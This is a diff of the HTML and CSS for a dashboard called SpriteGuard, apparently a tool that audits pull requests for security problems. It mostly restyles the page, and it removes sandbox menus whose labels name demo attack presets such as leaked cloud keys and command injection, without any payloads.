+        gap: 4px;
+        flex-wrap: wrap;
+      }
+      .trs em {
+        font-style: normal;
         font-size: 12px;
-        background: rgba(148, 163, 184, 0.14);
-        border: 1px solid rgba(148, 163, 184, 0.18);
-        padding: 1px 5px;
-        border-radius: 5px;
-        color: #e2e8f0;
+        padding: 1px 9px;
+        border-radius: 99px;
+        border: 1px solid var(--ln);
+        color: var(--mu);
       }
-      .spinner {
-        display: inline-block;
-        width: 12px;
-        height: 12px;
-        border: 2px solid rgba(255, 255, 255, 0.25);
-        border-top-color: currentColor;
-        border-radius: 50%;
-        animation: sg-spin 0.7s linear infinite;
-        vertical-align: -2px;
-        margin-right: 6px;
+      .trs em.done {
+        color: var(--ok);
+        border-color: currentColor;
       }
-      @keyframes sg-spin { to { transform: rotate(360deg); } }
-      @keyframes sg-pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.55; } }
+      .trs em.cur {
+        color: var(--tx);
+        background: var(--sb);
+        border-color: var(--mu);
+      }
+      .adv {
+        margin-top: 10px;
+        border-top: 1px solid var(--ln);
+        padding-top: 8px;
+      }
+      .adv summary {
+        cursor: pointer;
+        color: var(--mu);
+        font-size: 12.5px;
+      }
+      .adv dl {
+        display: grid;
+        grid-template-columns: 120px minmax(0, 1fr);
+        gap: 6px 12px;
+        margin-top: 8px;
+        font-size: 12.5px;
+      }
+      .adv dt {
+        color: var(--mu);
+      }
+      .adv dd {
+        margin: 0;
+        overflow-wrap: anywhere;
+      }
+      .note {
+        border: 1px solid var(--ln);
+        border-left: 3px solid var(--md);
+        border-radius: var(--r);
+        padding: 10px 12px;
+        margin-bottom: 12px;
+        background: var(--sb);
+        font-size: 13px;
+      }
+      .note b {
+        font-weight: 500;
+      }
+      .note.ok {
+        border-left-color: var(--ok);
+      }
+      .note.err {
+        border-left-color: var(--cr);
+      }
+      .cl {
+        list-style: none;
+        padding: 0;
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+      }
+      .cl li {
+        display: flex;
+        justify-content: space-between;
+        gap: 12px;
+        padding: 8px 12px;
+        font-size: 13px;
+      }
+      .cl li + li {
+        border-top: 1px solid var(--ln);
+      }
+      .cl span {
+        color: var(--mu);
+      }
+      .cl b {
+        font-weight: 500;
+      }
+
+      /* 5-Stage Patch Pipeline & Diff Viewer */
+      .pl {
+        list-style: none;
+        padding: 0;
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(112px, 1fr));
+        gap: 6px;
+        margin: 0 0 12px;
+      }
+      .pl li {
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        padding: 8px 10px;
+        display: grid;
+        gap: 1px;
+        font-size: 12px;
+        color: var(--mu);
+        align-content: start;
+      }
+      .pl li i {
+        width: 8px;
+        height: 8px;
+        border-radius: 2px;
+        border: 1.5px solid currentColor;
+        margin-bottom: 5px;
+      }
+      .pl li b {
+        color: var(--tx);
+        font-weight: 500;
+        font-size: 13px;
+      }
+      .pl li em {
+        font-style: normal;
+        font-weight: 500;
+        font-size: 12px;
+        color: currentColor;
+      }
+      .pl li span {
+        color: var(--mu);
+      }
+      .pl .ok {
+        color: var(--ok);
+      }
+      .pl .ai {
+        color: var(--ai);
+      }
+      .pl .w,
+      .pl .s {
+        color: var(--hi);
+      }
+      .pl .s {
+        border-style: dashed;
+      }
+      .pl .cur {
+        color: var(--ac);
+        border-color: var(--ac);
+      }
+      .pl .err {
+        color: var(--cr);
+      }
+      .pl .p {
+        opacity: 0.6;
+      }
+      .pl .ok i,
+      .pl .ai i,
+      .pl .w i,
+      .pl .err i {
+        background: currentColor;
+      }
+      .diff {
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        max-width: 100%;
+        overflow: auto;
+        overscroll-behavior-x: contain;
+        -webkit-overflow-scrolling: touch;
+        font: 12.5px/1.65 var(--m);
+      }
+      .dl {
+        display: grid;
+        grid-template-columns: 42px 20px 1fr;
+        white-space: pre;
+        min-width: max-content;
+      }
+      .dl > span:first-child {
+        position: sticky;
+        left: 0;
+        background: var(--pn);
+        z-index: 1;
+        color: var(--mu);
+        text-align: right;
+        padding-right: 8px;
+      }
+      .dl.fhead {
+        background: var(--sb);
+        color: var(--mu);
+        padding: 4px 10px;
+        display: block;
+        border-top: 1px solid var(--ln);
+      }
+      .dl.fhead:first-child {
+        border-top: 0;
+      }
+      .dl.hunk {
+        color: var(--ac);
+        background: var(--ar);
+      }
+      .dl.a {
+        background: var(--ad);
+      }
+      .dl.d {
+        background: var(--dl);
+      }
+      .dl.a span:nth-child(2) {
+        color: var(--ok);
+      }
+      .dl.d span:nth-child(2) {
+        color: var(--cr);
+      }
+      pre.raw {
+        font: 12.5px/1.6 var(--m);
+        color: var(--mu);
+        white-space: pre-wrap;
+        word-break: break-word;
+      }
+
       /* GitHub PR Comment Preview */
       .gh-comment {
-        border: 1px solid #30363d;
-        border-radius: 10px;
-        background: #0d1117;
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        background: var(--bg);
         overflow: hidden;
       }
       .gh-comment-head {
@@ -366,1081 +1168,960 @@
         align-items: center;
         justify-content: space-between;
         gap: 10px;
-        padding: 10px 14px;
-        background: #161b22;
-        border-bottom: 1px solid #30363d;
-        font-size: 13px;
+        padding: 9px 12px;
+        background: var(--sb);
+        border-bottom: 1px solid var(--ln);
+        font-size: 12.5px;
       }
       .gh-author {
         display: flex;
         align-items: center;
-        gap: 8px;
-      }
-      .gh-avatar {
-        width: 24px;
-        height: 24px;
-        border-radius: 50%;
-        background: linear-gradient(135deg, var(--accent), var(--accent-2));
-        color: #06080f;
-        font-weight: 800;
-        font-size: 11px;
-        display: grid;
-        place-items: center;
+        gap: 7px;
+        min-width: 0;
       }
       .gh-bot-pill {
         font-size: 11px;
-        padding: 1px 6px;
-        border-radius: 999px;
-        border: 1px solid #30363d;
-        color: #8b949e;
+        padding: 0 6px;
+        border-radius: 99px;
+        border: 1px solid var(--ln);
+        color: var(--mu);
       }
       .gh-body {
-        padding: 16px 18px;
+        padding: 14px 16px;
         font-size: 13px;
         line-height: 1.55;
-        color: #e6edf3;
       }
-      .gh-body h2 { font-size: 17px; margin: 0 0 10px; padding-bottom: 6px; border-bottom: 1px solid #21262d; }
-      .gh-body h3 { font-size: 15px; margin: 16px 0 8px; }
-      .gh-body h4 { font-size: 13.5px; margin: 12px 0 6px; }
-      .gh-body p { margin: 0 0 10px; }
-      .gh-body ul { margin: 4px 0 10px; padding-left: 20px; }
-      .gh-body li { margin: 3px 0; }
+      .gh-body h2 {
+        font-size: 16px;
+        margin: 0 0 10px;
+        padding-bottom: 6px;
+        border-bottom: 1px solid var(--ln);
+      }
+      .gh-body h3 {
+        font-size: 14.5px;
+        margin: 14px 0 8px;
+      }
+      .gh-body h4 {
+        font-size: 13px;
+        margin: 12px 0 6px;
+      }
+      .gh-body p {
+        margin: 0 0 9px;
+      }
+      .gh-body ul {
+        margin: 4px 0 10px;
+        padding-left: 20px;
+      }
+      .gh-body li {
+        margin: 3px 0;
+      }
       .gh-body blockquote {
-        margin: 8px 0 12px;
+        margin: 8px 0 10px;
         padding: 8px 12px;
-        border-left: 3px solid #3b82f6;
-        background: rgba(59, 130, 246, 0.08);
+        border-left: 3px solid var(--ac);
+        background: var(--sb);
         border-radius: 0 6px 6px 0;
-        color: #cbd5e1;
+        color: var(--mu);
       }
       .gh-callout {
         margin: 10px 0 12px;
-        padding: 10px 14px;
-        border-radius: 8px;
-        border-left: 4px solid #3b82f6;
-        background: rgba(59, 130, 246, 0.1);
+        padding: 10px 12px;
+        border-radius: var(--r);
+        border: 1px solid var(--ln);
+        border-left: 3px solid var(--ac);
+        background: var(--sb);
       }
-      .gh-callout.caution { border-left-color: var(--red); background: rgba(239, 68, 68, 0.12); color: #fecaca; }
-      .gh-callout.warning { border-left-color: var(--yellow); background: rgba(245, 158, 11, 0.12); color: #fde68a; }
-      .gh-callout.important { border-left-color: var(--accent); background: rgba(109, 124, 255, 0.12); }
-      .gh-callout-title { font-weight: 700; font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
+      .gh-callout.caution {
+        border-left-color: var(--cr);
+        background: color-mix(in srgb, var(--cr) 9%, transparent);
+      }
+      .gh-callout.warning {
+        border-left-color: var(--hi);
+        background: color-mix(in srgb, var(--hi) 9%, transparent);
+      }
+      .gh-callout-title {
+        font-weight: 600;
+        font-size: 11.5px;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+        margin-bottom: 4px;
+      }
       .gh-table {
         width: 100%;
         border-collapse: collapse;
-        margin: 8px 0 14px;
-        font-size: 12.5px;
-      }
-      .gh-table th, .gh-table td {
-        border: 1px solid #30363d;
-        padding: 7px 10px;
-      }
-      .gh-table th {
-        background: #161b22;
-        color: #c9d1d9;
-        text-transform: none;
-        letter-spacing: 0;
+        margin: 8px 0 12px;
         font-size: 12px;
       }
+      .gh-table th,
+      .gh-table td {
+        border: 1px solid var(--ln);
+        padding: 6px 9px;
+        text-align: left;
+      }
+      .gh-table th {
+        background: var(--sb);
+        font-weight: 600;
+      }
       .gh-details {
-        border: 1px solid #30363d;
-        border-radius: 8px;
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
         padding: 8px 12px;
         margin: 10px 0;
-        background: #0a0e14;
+        background: var(--pn);
       }
       .gh-details summary {
         cursor: pointer;
-        font-weight: 600;
-        color: #c9d1d9;
+        font-weight: 500;
       }
-      .gh-details[open] summary { margin-bottom: 10px; }
-      .gh-body a { color: #58a6ff; text-decoration: none; }
-      .gh-body a:hover { text-decoration: underline; }
-      .diff-add { color: #6ee7b7; background: rgba(16, 185, 129, 0.12); display: block; }
-      .diff-del { color: #fca5a5; background: rgba(239, 68, 68, 0.12); display: block; }
-      .diff-hunk { color: #7dd3fc; display: block; }
-      .empty {
-        text-align: center;
-        padding: 46px 16px;
-        color: var(--muted);
-      }
-      .toast {
-        position: fixed;
-        right: 20px;
-        bottom: 20px;
-        background: var(--panel-2);
-        border: 1px solid var(--accent);
-        color: var(--text);
-        padding: 10px 14px;
-        border-radius: 10px;
-        font-size: 13px;
-        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        display: none;
-        z-index: 50;
-      }
-      .toast.success {
-        background: #06281e;
-        border-color: var(--green);
-        color: #a7f3d0;
-      }
-      .toast.error {
-        background: #2a0d12;
-        border-color: var(--red);
-        color: #fecaca;
-      }
-      /* Connect GitHub Repo Modal */
-      .modal-backdrop {
-        position: fixed;
-        inset: 0;
-        background: rgba(3, 6, 14, 0.78);
-        backdrop-filter: blur(4px);
-        display: none;
-        align-items: center;
-        justify-content: center;
-        padding: 20px;
-        z-index: 100;
-      }
-      .modal-backdrop.open { display: flex; }
-      .modal {
-        width: 100%;
-        max-width: 640px;
-        max-height: 90vh;
-        overflow-y: auto;
-        background: var(--panel);
-        border: 1px solid var(--border);
-        border-radius: 16px;
-        box-shadow: 0 24px 60px rgba(0, 0, 0, 0.65);
-      }
-      .modal-head {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 16px 20px;
-        border-bottom: 1px solid var(--border);
-      }
-      .modal-head h2 { margin: 0; font-size: 16px; }
-      .modal-body { padding: 18px 20px 22px; font-size: 13px; }
-      .modal-section { margin-bottom: 18px; }
-      .modal-section:last-child { margin-bottom: 0; }
-      .modal-section h3 {
-        margin: 0 0 8px;
-        font-size: 12px;
-        text-transform: uppercase;
-        letter-spacing: 0.06em;
-        color: var(--accent-2);
-      }
-      .copy-row {
-        display: flex;
-        align-items: center;
-        gap: 8px;
+      .gh-details[open] summary {
         margin-bottom: 8px;
       }
-      .copy-row:last-child { margin-bottom: 0; }
-      .copy-code {
-        flex: 1;
-        padding: 8px 10px;
-        border-radius: 8px;
-        background: #05070d;
-        border: 1px solid var(--border);
-        font-family: var(--mono);
+      .gh-body code,
+      .bot code {
+        font-family: var(--m);
         font-size: 12px;
-        color: #e2e8f0;
-        overflow-x: auto;
+        background: var(--sb);
+        border: 1px solid var(--ln);
+        padding: 1px 5px;
+        border-radius: 5px;
+      }
+      .gh-body pre {
+        background: var(--pn);
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        padding: 10px 12px;
+        overflow: auto;
+        font: 12px/1.55 var(--m);
+        margin: 6px 0 10px;
+      }
+      .gh-body a {
+        color: var(--ac);
+        text-decoration: none;
+      }
+      .gh-body a:hover {
+        text-decoration: underline;
+      }
+
+      /* @spriteguard Q&A Footer */
+      .ask {
+        border-top: 1px solid var(--ln);
+        padding: 12px 20px 16px;
+        background: var(--sb);
+      }
+      .ask :focus-visible {
+        outline-color: var(--ai);
+      }
+      .th {
+        display: grid;
+        gap: 10px;
+        margin-bottom: 10px;
+        max-height: 230px;
+        overflow: auto;
+      }
+      .me {
+        justify-self: end;
+        background: var(--ais);
+        padding: 5px 11px;
+        border-radius: 12px 12px 3px 12px;
+        max-width: 90%;
+      }
+      .bot {
+        max-width: 95%;
+        font-size: 13.5px;
+      }
+      .bot p {
+        margin: 0 0 6px;
+      }
+      .bot p:last-of-type {
+        margin-bottom: 0;
+      }
+      .bot ul {
+        margin: 4px 0 6px;
+        padding-left: 18px;
+      }
+      .bot small {
+        display: block;
+        color: var(--mu);
+        font-size: 12px;
+        margin-top: 4px;
+      }
+      .bot small::before {
+        content: '';
+        display: inline-block;
+        width: 7px;
+        height: 7px;
+        border-radius: 2px;
+        background: var(--ai);
+        margin-right: 6px;
+      }
+      .chips {
+        display: flex;
+        gap: 6px;
+        flex-wrap: wrap;
+        margin-bottom: 8px;
+      }
+      .chips button {
+        font-size: 12.5px;
+        border: 1px solid var(--ln);
+        background: var(--pn);
+        border-radius: 99px;
+        padding: 2px 10px;
+        color: var(--mu);
+        transition: color 0.15s, border-color 0.15s;
+      }
+      .chips button:hover {
+        color: var(--tx);
+      }
+      .af {
+        display: flex;
+        gap: 8px;
+      }
+      .af input {
+        flex: 1;
+        min-width: 0;
+        height: 34px;
+        min-height: var(--h);
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        background: var(--pn);
+        padding: 0 11px;
+        color: var(--tx);
+        font: inherit;
+      }
+      .af input:focus {
+        outline: 0;
+        border-color: var(--ai);
+      }
+      .af input[aria-invalid='true'] {
+        border-color: var(--cr);
+      }
+
+      /* Footer & Modals */
+      .foot {
+        display: flex;
+        gap: 8px 20px;
+        flex-wrap: wrap;
+        color: var(--mu);
+        font-size: 12.5px;
+        padding: 18px 20px 30px;
+        align-items: center;
+      }
+      .foot span {
+        display: inline-flex;
+        gap: 7px;
+        align-items: center;
+      }
+      dialog {
+        border: 1px solid var(--ln);
+        border-radius: var(--R);
+        background: var(--pn);
+        color: var(--tx);
+        padding: 0;
+        max-width: 520px;
+        width: calc(100% - 32px);
+        max-height: calc(100dvh - 32px - env(safe-area-inset-top, 0px) - env(safe-area-inset-bottom, 0px));
+        margin: auto;
+        overflow: auto;
+        overscroll-behavior: contain;
+      }
+      dialog[open] {
+        animation: fadeIn 0.18s ease-out;
+      }
+      dialog::backdrop {
+        background: #0009;
+      }
+      .dg {
+        padding: 20px;
+      }
+      .dg h3 {
+        font-size: 16px;
+        font-weight: 600;
+        margin-bottom: 6px;
+      }
+      .dg h4 {
+        font-size: 13px;
+        font-weight: 600;
+        margin: 16px 0 4px;
+      }
+      .dg p {
+        color: var(--mu);
+        font-size: 13px;
+      }
+      .dgb {
+        display: flex;
+        justify-content: flex-end;
+        gap: 8px;
+        margin-top: 18px;
+      }
+      .cp {
+        display: flex;
+        gap: 8px;
+        margin-top: 6px;
+      }
+      .cp code {
+        flex: 1;
+        min-width: 0;
+        background: var(--sb);
+        border-radius: 6px;
+        padding: 5px 10px;
+        font-size: 12.5px;
+        overflow: auto;
         white-space: nowrap;
       }
-      .checklist {
+      #fpt {
+        width: 100%;
+        height: min(46vh, 320px);
+        margin-top: 10px;
+        background: var(--sb);
+        color: var(--tx);
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        padding: 10px;
+        font: 12.5px/1.55 var(--m);
+        resize: none;
+      }
+      #pal {
+        max-width: 560px;
+        margin: 12vh auto auto;
+      }
+      .pal {
+        padding: 0;
+      }
+      .ph {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding-right: 10px;
+        border-bottom: 1px solid var(--ln);
+      }
+      .ph input {
+        width: 100%;
+        height: 46px;
+        border: 0;
+        background: transparent;
+        color: var(--tx);
+        font: inherit;
+        font-size: 16px;
+        padding: 0 16px;
+        outline: 0;
+        flex: 1;
+        min-width: 0;
+      }
+      #pk {
+        list-style: none;
+        padding: 6px;
+        max-height: 50vh;
+        overflow: auto;
+      }
+      #pk li {
+        display: flex;
+        justify-content: space-between;
+        gap: 12px;
+        padding: 9px 10px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 13.5px;
+      }
+      #pk li span {
+        min-width: 0;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+      #pk li small {
+        color: var(--mu);
+        white-space: nowrap;
+      }
+      #pk li[aria-selected='true'] {
+        background: var(--ar);
+      }
+      .hl {
         list-style: none;
         padding: 0;
-        margin: 0;
+        margin-top: 12px;
         display: grid;
-        gap: 6px;
+        gap: 8px;
       }
-      .checklist li {
-        padding: 8px 10px;
-        border-radius: 8px;
-        background: var(--panel-2);
-        border: 1px solid var(--border);
+      .hl li {
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        padding: 8px 12px;
+        font-size: 13px;
+      }
+      .hl li div {
+        display: flex;
+        justify-content: space-between;
+        gap: 8px;
+        align-items: center;
+      }
+      .hl p {
+        color: var(--mu);
+        margin-top: 4px;
         font-size: 12.5px;
       }
-      /* Sandbox 2-tab Panel */
-      .demo-bar {
-        flex-direction: column;
-        align-items: stretch;
-        gap: 12px;
+      .hs {
+        font-style: normal;
+        font-size: 12px;
+        border: 1px solid currentColor;
+        border-radius: 99px;
+        padding: 0 8px;
+        color: var(--mu);
       }
-      .sandbox-head {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        flex-wrap: wrap;
+      .hs.ok {
+        color: var(--ok);
+      }
+      .hs.degraded {
+        color: var(--hi);
+      }
+      .hs.down {
+        color: var(--cr);
+      }
+      .steps {
+        list-style: none;
+        padding: 0;
+        display: grid;
         gap: 10px;
       }
-      .sandbox-tabs {
+      .steps li {
         display: flex;
-        gap: 6px;
-      }
-      .sandbox-pane { display: none; }
-      .sandbox-pane.active { display: block; }
-      .sandbox-row {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 8px;
+        gap: 10px;
         align-items: center;
+        color: var(--mu);
       }
-      .custom-grid {
-        display: grid;
-        grid-template-columns: 1fr 240px;
-        gap: 8px;
-        margin-bottom: 8px;
+      .steps li.on {
+        color: var(--tx);
       }
-      @media (max-width: 720px) {
-        .custom-grid { grid-template-columns: 1fr; }
+      .steps li.done {
+        color: var(--ok);
       }
-      textarea.code-input {
-        width: 100%;
-        min-height: 130px;
-        font-family: var(--mono);
-        font-size: 12px;
-        line-height: 1.5;
-        background: #05070d;
-        color: #e6ecf8;
-        border: 1px solid var(--border);
+      .steps li i {
+        width: 9px;
+        height: 9px;
+        border-radius: 2px;
+        border: 1.5px solid currentColor;
+      }
+      .steps li.on i {
+        background: var(--ac);
+        border-color: var(--ac);
+        animation: pulse 1s infinite;
+      }
+      .steps li.done i {
+        background: currentColor;
+      }
+
+      /* Toast */
+      #t {
+        position: fixed;
+        left: 50%;
+        bottom: calc(20px + env(safe-area-inset-bottom, 0px));
+        transform: translateX(-50%);
+        background: var(--tx);
+        color: var(--bg);
+        padding: 8px 14px;
         border-radius: 8px;
-        padding: 10px 12px;
-        resize: vertical;
+        font-size: 13px;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.2s;
+        z-index: 80;
+        max-width: calc(100% - 32px);
       }
-      .preset-btn {
-        font-size: 12px;
-        padding: 5px 10px;
-        background: rgba(109, 124, 255, 0.12);
-        border-color: rgba(109, 124, 255, 0.35);
-        color: #c7d2fe;
+      #t.on {
+        opacity: 1;
+        pointer-events: auto;
       }
-      button.connect-btn {
-        background: rgba(34, 211, 238, 0.12);
-        border-color: rgba(34, 211, 238, 0.4);
-        color: #a5f3fc;
+      #t.err {
+        background: var(--cr);
+        color: #fff;
+      }
+      .ub {
+        margin-left: 8px;
+        color: inherit;
+        text-decoration: underline;
+        font: inherit;
+        cursor: pointer;
+      }
+
+      /* Responsive & Accessibility */
+      @media (pointer: coarse) {
+        .btn {
+          min-height: 40px;
+        }
+        .seg button,
+        .chips button {
+          min-height: 34px;
+        }
+        .af input {
+          height: 40px;
+        }
+        details.f summary,
+        .tabs button {
+          min-height: 44px;
+        }
+      }
+      @media (hover: none) {
+        kbd,
+        .foot span:last-child {
+          display: none;
+        }
+      }
+      @media (max-width: 1000px) {
+        .grid {
+          grid-template-columns: minmax(0, 1fr);
+        }
+        .dt {
+          position: static;
+        }
+        .pane {
+          max-height: none;
+          overflow: visible;
+        }
+      }
+      @media (max-width: 800px) {
+        .demo-pane,
+        .custom-fields {
+          grid-template-columns: 1fr;
+        }
+        .demo .btn.pri {
+          min-height: 44px;
+          justify-content: center;
+        }
+        .sel select {
+          font-size: 16px;
+          min-height: 44px;
+        }
+        .adv dl {
+          grid-template-columns: 1fr;
+        }
+        .adv dt {
+          margin-top: 6px;
+        }
+      }
+      @media (max-width: 640px) {
+        body {
+          font-size: 15px;
+        }
+        .wrap {
+          padding: 0 16px;
+        }
+        .top {
+          gap: 8px;
+        }
+        .top .grow {
+          display: none;
+        }
+        .brand {
+          flex: 1 1 100%;
+        }
+        .top .btn {
+          flex: 1 1 auto;
+          justify-content: center;
+          min-height: 40px;
+        }
+        .stats {
+          grid-template-columns: 1fr 1fr;
+          margin: 16px 0;
+        }
+        .stats > div {
+          padding: 12px 14px;
+        }
+        .stats > div:nth-child(3) {
+          border-left: 0;
+        }
+        .stats > div:nth-child(n + 3) {
+          border-top: 1px solid var(--ln);
+        }
+        .stats b {
+          font-size: 21px;
+        }
+        .stats b span {
+          font-size: 12px;
+        }
+        .seg {
+          width: 100%;
+        }
+        .seg button {
+          flex: 1;
+        }
+        .q,
+        .af input,
+        .inp,
+        .code-ta {
+          font-size: 16px;
+        }
+        .row {
+          grid-template-columns: 52px minmax(0, 1fr);
+          padding: 12px 14px;
+        }
+        .row .chip {
+          grid-column: 2;
+          justify-self: start;
+        }
+        .rt {
+          white-space: normal;
+          display: -webkit-box;
+          -webkit-line-clamp: 2;
+          -webkit-box-orient: vertical;
+        }
+        .dh,
+        .pane,
+        .sid,
+        .ask,
+        .bn {
+          padding-left: 16px;
+          padding-right: 16px;
+        }
+        .acts {
+          width: 100%;
+        }
+        .acts .btn {
+          flex: 1;
+          justify-content: center;
+        }
+        .facts {
+          grid-template-columns: repeat(3, 1fr);
+        }
+        .facts > div {
+          padding: 10px 12px;
+          border-top: 0;
+          border-left: 1px solid var(--ln);
+        }
+        .facts > div:first-child {
+          border-left: 0;
+        }
+        .facts b {
+          font-size: 15px;
+        }
+        .facts .gauge {
+          display: none;
+        }
+        .cb {
+          grid-template-columns: 100px 1fr 30px;
+        }
+        details.f summary {
+          flex-wrap: wrap;
+        }
+        .ft {
+          flex: 1 1 60%;
+        }
+        .fb {
+          padding: 0 12px 12px;
+        }
+        .foot {
+          padding: 16px 16px 28px;
+          gap: 10px;
+        }
+        dialog {
+          margin: auto 16px 12px;
+          width: calc(100% - 32px);
+        }
+        #pal {
+          margin: 8px auto auto;
+          width: calc(100% - 16px);
+        }
+        #pk {
+          max-height: 36dvh;
+        }
+        .dgb {
+          flex-direction: column-reverse;
+        }
+        .dgb .btn {
+          min-height: 44px;
+          justify-content: center;
+        }
+        .cp {
+          flex-wrap: wrap;
+        }
+        .cp .btn {
+          flex: none;
+        }
+      }
+      @media (prefers-reduced-motion: reduce) {
+        * {
+          animation: none !important;
+          transition: none !important;
+        }
       }
     </style>
   </head>
   <body>
-    <div class="wrap">
-      <header>
+    <div class="top-bar">
+      <header class="wrap top">
         <div class="brand">
-          <div class="logo" aria-hidden="true">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" fill="none">
-              <defs>
-                <linearGradient id="sg-h-bg" x1="0" y1="0" x2="64" y2="64" gradientUnits="userSpaceOnUse">
-                  <stop offset="0%" stop-color="#11182c"/>
-                  <stop offset="100%" stop-color="#070a13"/>
-                </linearGradient>
-                <linearGradient id="sg-h-acc" x1="10" y1="8" x2="54" y2="56" gradientUnits="userSpaceOnUse">
-                  <stop offset="0%" stop-color="#6d7cff"/>
-                  <stop offset="55%" stop-color="#38bdf8"/>
-                  <stop offset="100%" stop-color="#22d3ee"/>
-                </linearGradient>
-                <linearGradient id="sg-h-fill" x1="32" y1="10" x2="32" y2="54" gradientUnits="userSpaceOnUse">
-                  <stop offset="0%" stop-color="#1e2948" stop-opacity="0.95"/>
-                  <stop offset="100%" stop-color="#0b1020" stop-opacity="0.95"/>
-                </linearGradient>
-              </defs>
-              <rect x="2" y="2" width="60" height="60" rx="14" fill="url(#sg-h-bg)" stroke="url(#sg-h-acc)" stroke-width="2" stroke-opacity="0.65"/>
-              <path d="M32 10L50 17.5V31.5C50 43.2 42.3 51.3 32 55C21.7 51.3 14 43.2 14 31.5V17.5L32 10Z" fill="url(#sg-h-fill)" stroke="url(#sg-h-acc)" stroke-width="2.4" stroke-linejoin="round"/>
-              <path d="M32 18V24M32 40V46M20 32H24M40 32H44" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-opacity="0.9"/>
-              <path d="M23.5 23.5L26.5 26.5M40.5 23.5L37.5 26.5M23.5 40.5L26.5 37.5M40.5 40.5L37.5 37.5" stroke="#6d7cff" stroke-width="1.6" stroke-linecap="round" stroke-opacity="0.8"/>
-              <rect x="24" y="24" width="16" height="16" rx="3.5" fill="#090e1c" stroke="url(#sg-h-acc)" stroke-width="2"/>
-              <path d="M28.2 32.3L30.9 35L36.2 29.3" stroke="#10b981" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
-              <circle cx="32" cy="17.5" r="1.8" fill="#22d3ee"/>
-              <circle cx="32" cy="46.5" r="1.8" fill="#6d7cff"/>
-              <circle cx="19.5" cy="32" r="1.8" fill="#22d3ee"/>
-              <circle cx="44.5" cy="32" r="1.8" fill="#6d7cff"/>
-            </svg>
-          </div>
-          <div>
-            <h1>SpriteGuard</h1>
-            <p>Zero-Trust Autonomous PR Security Engineer · Fly Sprites + Universal LLM + Neon pgvector</p>
-          </div>
+          <svg
+            id="brand-logo"
+            class="brand-logo"
+            data-sprite-state="idle"
+            width="24"
+            height="24"
+            viewBox="0 0 24 24"
+            fill="none"
+            aria-hidden="true"
+          >
+            <defs>
+              <clipPath id="sg-cell-clip">
+                <rect x="8.5" y="8.5" width="7" height="7" rx="1.5" />
+              </clipPath>
+            </defs>
+            <path d="M8 4H4v16h4" stroke="currentColor" stroke-width="2" stroke-linecap="butt" stroke-linejoin="miter" />
+            <path d="M16 4h4v16h-4" stroke="currentColor" stroke-width="2" stroke-linecap="butt" stroke-linejoin="miter" />
+            <rect id="logo-cell" x="8.5" y="8.5" width="7" height="7" rx="1.5" fill="var(--ac)" />
+            <g id="logo-cell-sleeping" clip-path="url(#sg-cell-clip)">
+              <rect x="8.5" y="8.5" width="3.5" height="7" fill="var(--ac)" />
+              <rect x="12" y="8.5" width="3.5" height="7" fill="var(--mu)" opacity="0.38" />
+            </g>
+          </svg>
+          SpriteGuard
+          <span class="env" id="env-pill"><i class="dot" id="env-dot"></i><span id="env-text">Connecting</span></span>
         </div>
-        <div class="controls">
-          <button class="connect-btn" id="open-connect-btn">Connect GitHub Repo</button>
-          <span class="pill" id="mode-pill"><span class="dot" id="mode-dot"></span><span id="mode-text">Connecting…</span></span>
-          <span class="pill" id="refresh-pill">Auto-refresh 5s</span>
-          <button id="toggle-auto">Pause</button>
-          <button id="refresh-now">Refresh</button>
-        </div>
+        <div class="grow"></div>
+        <button class="btn live" id="live" aria-pressed="true" title="Toggle 5s background polling">
+          <i class="dot"></i><span>Live</span>
+        </button>
+        <button class="btn" id="cbtn">Connect repo</button>
+        <button class="btn" id="kbtn" title="Search audits and run actions (Ctrl or ⌘ K)">
+          Search <kbd>⌘K</kbd>
+        </button>
+        <button class="btn" id="theme-btn" title="Toggle Light / Dark theme" aria-label="Toggle theme">Dark</button>
       </header>
-
-      <section class="demo-bar" id="demo-bar">
-        <div class="sandbox-head">
-          <div class="left">
-            <strong>Interactive Sandbox Playground:</strong> run zero-trust PR audits against the isolated Sprite pipeline.
-          </div>
-          <div class="sandbox-tabs">
-            <button type="button" class="tab-btn active" data-sandbox-tab="fixtures">Demo PR Fixtures</button>
-            <button type="button" class="tab-btn" data-sandbox-tab="custom">Audit Custom Code / Diff</button>
-          </div>
-        </div>
-
-        <div class="sandbox-pane active" id="sandbox-pane-fixtures">
-          <div class="sandbox-row">
-            <select id="demo-kind">
-              <option value="vulnerable">Vulnerable PR (Stripe/AWS/.env Leaks + Canary Exfil)</option>
-              <option value="clean">Clean PR (Safe Input Validation)</option>
-            </select>
-            <button class="primary" id="run-demo-btn">Run Demo PR Audit</button>
-          </div>
-        </div>
-
-        <div class="sandbox-pane" id="sandbox-pane-custom">
-          <div class="sandbox-row" style="margin-bottom:8px">
-            <span class="muted" style="font-size:12px">Attack Presets:</span>
-            <button type="button" class="preset-btn" data-preset="leaked-keys">Leaked Cloud Keys</button>
-            <button type="button" class="preset-btn" data-preset="malicious-egress">Malicious Install Egress</button>
-            <button type="button" class="preset-btn" data-preset="cmd-injection">Command Injection</button>
-          </div>
-          <form id="custom-audit-form">
-            <div class="custom-grid">
-              <input type="text" id="custom-title" placeholder="PR Title (e.g., feat(auth): add cloud storage uploader)" value="feat(cloud): add storage client config" />
